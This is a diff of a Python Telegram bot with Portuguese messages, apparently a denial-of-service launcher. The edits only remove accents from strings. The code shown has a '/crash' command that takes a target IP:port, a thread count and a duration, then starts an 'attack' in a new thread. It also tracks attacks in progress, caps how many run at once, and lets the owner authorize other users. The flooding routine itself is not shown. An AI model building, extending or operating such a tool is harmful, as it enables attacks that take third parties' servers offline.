@@ -48,13 +48,13 @@ def manage_attacks():
 def start_message(message):
     welcome_text = (
         "Bem-vindo ao bot! \n\n"
-        "Aqui estão os comandos disponíveis para você:\n\n"
-        "Comandos básicos:\n"
+        "Aqui estao os comandos disponiveis para voce:\n\n"
+        "Comandos basicos:\n"
         "/crash <IP:PORTA> <threads> <tempo> - Envia um ataque ao IP especificado.\n"
-        "/meuid - Mostra seu ID de usuário.\n\n"
-        "Comandos para usuários autorizados:\n"
-        "/adduser <ID> - Adiciona um usuário autorizado.\n"
-        "/removeuser <ID> - Remove um usuário autorizado.\n\n"
+        "/meuid - Mostra seu ID de usuario.\n\n"
+        "Comandos para usuarios autorizados:\n"
+        "/adduser <ID> - Adiciona um usuario autorizado.\n"
+        "/removeuser <ID> - Remove um usuario autorizado.\n\n"
         "Entre em contato se precisar de ajuda! "
     )
     bot.send_message(message.chat.id, welcome_text)
@@ -84,17 +84,17 @@ def crash_server(message):
 
     # Verificar se ja existe um processo em andamento para o mesmo IP
     if ip_porta in processos:
-        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
+        bot.send_message(message.chat.id, f"Ja existe um ataque em andamento para {ip_porta}. Tente novamente mais tarde.")
         return
 
     if not validar_ip_porta(ip_porta):
-        bot.send_message(message.chat.id, "Formato de IP:PORTA inválido.")
+        bot.send_message(message.chat.id, "Formato de IP:PORTA invalido.")
         return
 
     # Gerenciar o limite de ataques simultaneos
     manage_attacks()
 
-    # Notificar que o ataque vai começar
+    # Notificar que o ataque vai comecar
     bot.send_message(message.chat.id, f"Iniciando o ataque para {ip_porta} com {threads} threads por {tempo} segundos...")
 
     # Iniciar o ataque em uma nova thread
@@ -104,7 +104,7 @@ def crash_server(message):
 # Comando /meuid
 @bot.message_handler(commands=['meuid'])
 def send_user_id(message):
-    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")
+    bot.send_message(message.chat.id, f"Seu ID de usuario e: {message.from_user.id}")
 
 # Comandos de administracao (somente o dono pode usar)
 @bot.message_handler(commands=['adduser', 'removeuser'])
@@ -123,16 +123,16 @@ def admin_commands(message):
     if comando[0] == "adduser":
         if usuario_id not in authorized_users:
             authorized_users.append(usuario_id)
-            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
+            bot.send_message(message.chat.id, f"Usuario {usuario_id} adicionado com sucesso.")
         else:
-            bot.send_message(message.chat.id, "Usuário já autorizado.")
+            bot.send_message(message.chat.id, "Usuario ja autorizado.")
     
     elif comando[0] == "removeuser":
         if usuario_id in authorized_users:
             authorized_users.remove(usuario_id)
-            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
+            bot.send_message(message.chat.id, f"Usuario {usuario_id} removido com sucesso.")
         else:
-            bot.send_message(message.chat.id, "Usuário não encontrado.")
+            bot.send_message(message.chat.id, "Usuario nao encontrado.")
 
 # Funcao para manter o bot ativo (reconectar automaticamente em caso de falhas)
 def keep_alive():
